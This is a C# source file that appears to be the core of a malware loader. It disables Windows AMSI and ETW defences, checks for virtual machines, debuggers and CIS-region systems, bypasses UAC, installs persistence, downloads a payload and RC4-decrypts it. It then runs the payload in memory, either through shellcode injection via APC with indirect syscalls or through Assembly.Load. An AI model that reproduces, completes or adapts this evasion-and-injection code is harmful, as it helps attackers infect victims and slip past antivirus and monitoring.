using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Reflection;

namespace MfRunner
{

    internal partial class Program
    {
#if (BYPASS_UAC || PERSISTANCE)
        public static bool IsElevated;

        public static void InitializeIsElevated()
        {
            IsElevated = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

#endif
        public static byte[] PAYLOAD_BYTES;

        static void Main(string[] args)
        {
            // Console.WriteLine("HR: 0x{0}", HashString("timebeginperiod").ToString("X"));
            InitializeNativeFunctions1();
            //CustomLoadLibraryExA("winmm.dll");
            //InitializeNativeFunctions2();
#if !NATIVE
            PatchDotNetAMSI(false); // Required for loading an assembly, have 1/2 CLR specific patches run early.
#endif
#if ANTI_VM
            CrashIfVm();
            //CrashIfEmulator();
#endif
#if BLACKLIST_CIS
            CrashIfCIS();
#endif
#if SINGLE_INSTANCE
            CloseIfAlreadyRunning();
#endif
#if ANTI_DEBUG
            StartDebuggerCheckThread();
            Thread.Sleep(500); // Make sure that the first check has definitely happened before continuing any further
#endif
            try
            {
                DownloadPayload();
                if (FuckShitUp == 0 && args.Length != 2)
                {
#if (BYPASS_UAC || PERSISTANCE)
                    if (args.Length == 1)
                    {
                        InitializeIsElevated();
#if BYPASS_UAC
                        PerformUacBypass(CreateStartupCommand(args[0], false));
#endif
#if PERSISTANCE
                        InitializePersistance(CreateStartupCommand(args[0], true));
#endif
#endif
                    }
                    AmsiAddress = (long)CustomLoadLibraryExA("amsi.dll", IntPtr.Zero, 0x800);
                    PatchAMSI();
                    PatchETW();

                } else
                {
                    FuckShitUp *= 2;
                }
                if (FuckShitUp < 1)
                {
#if NATIVE
                    InitializeIndirectSyscalls();
                    IntPtr allocatedBuffer = IntPtr.Zero;
                    uint bufferSize = (uint)PAYLOAD_BYTES.Length;
                    CustomNtAllocateVirtualMemory((IntPtr)(-1), ref allocatedBuffer, 0, ref bufferSize, 0x00003000, 0x40);
                    if (allocatedBuffer == IntPtr.Zero)
                    {
                        FuckShitUp = 4;
                        CrashExit();
                    } else
                    {
                        ApplyRC4(PAYLOAD_BYTES, DeriveKey(SEED_PAYLOAD));
                        CopyFunction(allocatedBuffer, PAYLOAD_BYTES);
                        CustomNtQueueApcThread((IntPtr)(-2), allocatedBuffer, IntPtr.Zero, IntPtr.Zero, 0);
                        CustomNtTestAlert();
                    }
#else
                    ApplyRC4(PAYLOAD_BYTES, DeriveKey(SEED_PAYLOAD));
                    PatchDotNetAMSI(true); // Required for loading an assembly, we have to do this early.
                    MethodInfo payloadEntryPoint = Assembly.Load(PAYLOAD_BYTES).EntryPoint;
                    payloadEntryPoint = payloadEntryPoint.GetBaseDefinition(); // Fuckery
                    object[] entryPointParameters = null;
                    if (payloadEntryPoint.GetParameters().Length == 1)
                    {
                        entryPointParameters = new object[1];
                        entryPointParameters[0] = new string[] { }; // Probably the only way it hasn't been done before.
                    }
                    payloadEntryPoint.Invoke(null, entryPointParameters);
#endif
                }
                else
                {
                    FuckShitUp = 1;
                }
            }
            finally
            {
#if SINGLE_INSTANCE
                SingleInstanceMutex.ReleaseMutex();
#endif
            }
        }
    }
}
